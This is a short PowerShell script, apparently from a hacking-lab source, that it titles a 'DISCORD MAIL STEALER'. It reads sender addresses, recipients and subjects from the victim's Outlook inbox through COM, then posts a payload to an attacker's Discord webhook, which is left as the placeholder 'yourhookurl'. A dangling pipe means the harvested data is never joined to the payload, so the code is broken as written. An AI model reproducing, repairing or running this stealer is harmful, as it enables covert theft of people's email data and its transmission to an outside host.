
function Log-Message
{
    [CmdletBinding()]
    Param
    (
        [Parameter(Mandatory=$true, Position=0)]
        [string]$LogMessage
    )

    Write-Output (" [DZHACKLAB] - ELMO9AWIM {0} - {1}" -f (Get-Date), $LogMessage)
}

Log-Message " [*] START JOB ------------------- ELMO9AWIM "


$olFolderInbox = 6
$outlook = new-object -com outlook.application;
$mapi = $outlook.GetNameSpace("MAPI");
$inbox = $mapi.GetDefaultFolder($olFolderInbox)
$inbox.items|Select SenderEmailAddress,to,subject|Format-Table -AutoSize |


#Store webhook url
$webHookUrl = 'yourhookurl'

#Create embed array
[System.Collections.ArrayList]$embedArray = @()

#Store embed values
$title       = 'DISCORD STEALER'
$description = 'DISCORD MAIL STEALER'
$color       = '1'

#Create thumbnail object
$thumbUrl = 'https://static1.squarespace.com/static/5644323de4b07810c0b6db7b/t/5aa44874e4966bde3633b69c/1520715914043/webhook_resized.png' 
$thumbnailObject = [PSCustomObject]@{

    url = $thumbUrl

}

#Create embed object, also adding thumbnail
$embedObject = [PSCustomObject]@{

    title       = $title
    description = $description
    color       = $color
    thumbnail   = $thumbnailObject

}

#Add embed object to array
$embedArray.Add($embedObject) | Out-Null

#Create the payload
$payload = [PSCustomObject]@{

    embeds = $embedArray

}

#Send over payload, converting it to JSON
Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
